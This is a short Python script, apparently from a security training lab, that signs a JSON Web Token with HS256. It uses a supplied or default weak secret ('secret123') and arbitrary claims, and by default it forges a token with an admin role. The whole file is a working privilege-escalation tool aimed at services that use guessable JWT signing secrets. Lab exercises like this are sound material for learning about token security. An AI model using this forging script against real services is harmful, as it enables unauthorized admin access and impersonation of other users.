import argparse
import base64
import hashlib
import hmac
import json


def b64url(data):
    raw = json.dumps(data, separators=(",", ":")).encode("utf-8")
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def sign_token(secret, payload):
    header = {"alg": "HS256", "typ": "JWT"}
    encoded_header = b64url(header)
    encoded_payload = b64url(payload)
    signing_input = f"{encoded_header}.{encoded_payload}".encode("utf-8")
    signature = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    encoded_signature = base64.urlsafe_b64encode(signature).rstrip(b"=").decode("ascii")
    return f"{encoded_header}.{encoded_payload}.{encoded_signature}"


def main():
    parser = argparse.ArgumentParser(
        description="Forge an admin JWT for the Acme training lab."
    )
    parser.add_argument("--secret", default="secret123", help="JWT secret")
    parser.add_argument("--sub", type=int, default=1, help="User ID")
    parser.add_argument("--username", default="alice", help="Username")
    parser.add_argument("--role", default="admin", help="Role claim")
    parser.add_argument(
        "--department", default="engineering", help="Department claim"
    )
    args = parser.parse_args()

    payload = {
        "sub": args.sub,
        "username": args.username,
        "role": args.role,
        "department": args.department,
    }
    print(sign_token(args.secret, payload))


if __name__ == "__main__":
    main()
